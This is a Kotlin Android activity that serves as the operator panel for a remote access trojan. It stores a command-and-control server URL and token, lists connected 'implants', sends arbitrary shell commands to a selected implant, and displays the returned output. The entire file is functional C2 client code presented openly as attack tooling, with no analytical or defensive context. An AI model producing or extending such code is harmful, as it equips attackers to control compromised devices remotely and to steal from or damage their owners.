// language: Kotlin, file: MainActivity.kt
package com.panel.rat

import android.content.Context
import android.os.Bundle
import android.text.method.ScrollingMovementMethod
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.*
import java.io.IOException

class MainActivity : AppCompatActivity() {
    private val http = OkHttpClient.Builder()
        .connectTimeout(15, java.util.concurrent.TimeUnit.SECONDS)
        .readTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
        .build()
    private lateinit var prefs: android.content.SharedPreferences

    override fun onCreate(s: Bundle?) {
        super.onCreate(s)
        prefs = getSharedPreferences("rat", Context.MODE_PRIVATE)
        if (!prefs.contains("url")) {
            askSetup { url, token ->
                prefs.edit().putString("url", url).putString("token", token).apply()
                buildUi()
            }
        } else buildUi()
    }

    private fun askSetup(done: (String, String) -> Unit) {
        val v = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL; setPadding(40, 80, 40, 40)
        }
        val urlIn = EditText(this).apply { hint = "https://vps.example.net:8080" }
        val tokIn = EditText(this).apply { hint = "token" }
        val okBtn = Button(this).apply { text = "Save" }
        v.addView(TextView(this).apply { text = "C2 URL:" }); v.addView(urlIn)
        v.addView(TextView(this).apply { text = "Token:"  }); v.addView(tokIn)
        v.addView(okBtn); setContentView(v)
        okBtn.setOnClickListener {
            done(urlIn.text.toString().trimEnd('/'), tokIn.text.toString())
        }
    }

    private fun buildUi() {
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL; setPadding(24, 24, 24, 24)
        }
        val spin  = Spinner(this)
        val input = EditText(this).apply { hint = "команда" }
        val send  = Button(this).apply { text = "Send" }
        val out   = TextView(this).apply {
            textSize = 12f; setTextIsSelectable(true)
            movementMethod = ScrollingMovementMethod()
        }
        val scroll  = ScrollView(this).apply { addView(out) }
        val refresh = Button(this).apply { text = "Refresh implants" }
        root.addView(refresh); root.addView(spin); root.addView(input); root.addView(send)
        root.addView(scroll, LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, 0, 1f))
        setContentView(root)

        val ids = mutableListOf<String>()
        val adapter = ArrayAdapter(this,
            android.R.layout.simple_spinner_dropdown_item, ids)
        spin.adapter = adapter

        fun refreshList() = CoroutineScope(Dispatchers.IO).launch {
            try {
                val r = http.newCall(auth(Request.Builder()
                    .url("${prefs.getString("url", "")}/panel/implants"))
                    .build()).execute()
                val obj = JSONObject(r.body!!.string())
                val list = obj.keys().asSequence().toList()
                withContext(Dispatchers.Main) {
                    ids.clear(); ids.addAll(list); adapter.notifyDataSetChanged()
                }
            } catch (e: IOException) {
                withContext(Dispatchers.Main) { out.text = "[!] C2 unreachable: ${e.message}" }
            }
        }
        refresh.setOnClickListener { refreshList() }

        send.setOnClickListener {
            val id = ids.getOrNull(spin.selectedItemPosition) ?: return@setOnClickListener
            val cmd = input.text.toString(); if (cmd.isBlank()) return@setOnClickListener
            input.setText("")
            CoroutineScope(Dispatchers.IO).launch {
                try {
                    val body = JSONObject().put("id", id).put("cmd", cmd)
                        .toString().toRequestBody("application/json".toMediaType())
                    http.newCall(auth(Request.Builder()
                        .url("${prefs.getString("url", "")}/panel/send")
                        .post(body)).build()).execute()
                    delay(5000)
                    val r = http.newCall(auth(Request.Builder()
                        .url("${prefs.getString("url", "")}/panel/results/$id"))
                        .build()).execute()
                    val arr = JSONArray(r.body!!.string())
                    val sb = StringBuilder(out.text)
                    for (i in 0 until arr.length()) {
                        val o = arr.getJSONObject(i)
                        sb.append("$ ").append(o.optString("cmd")).append("\n")
                        sb.append(o.optString("out")).append("\n\n")
                    }
                    withContext(Dispatchers.Main) { out.text = sb.toString() }
                } catch (e: IOException) {
                    withContext(Dispatchers.Main) { out.append("\n[!] ${e.message}\n") }
                }
            }
        }
        CoroutineScope(Dispatchers.IO).launch {
            while (isActive) { refreshList(); delay(10000) }
        }
    }

    private fun auth(b: Request.Builder) =
        b.header("X-Token", prefs.getString("token", "") ?: "")
}
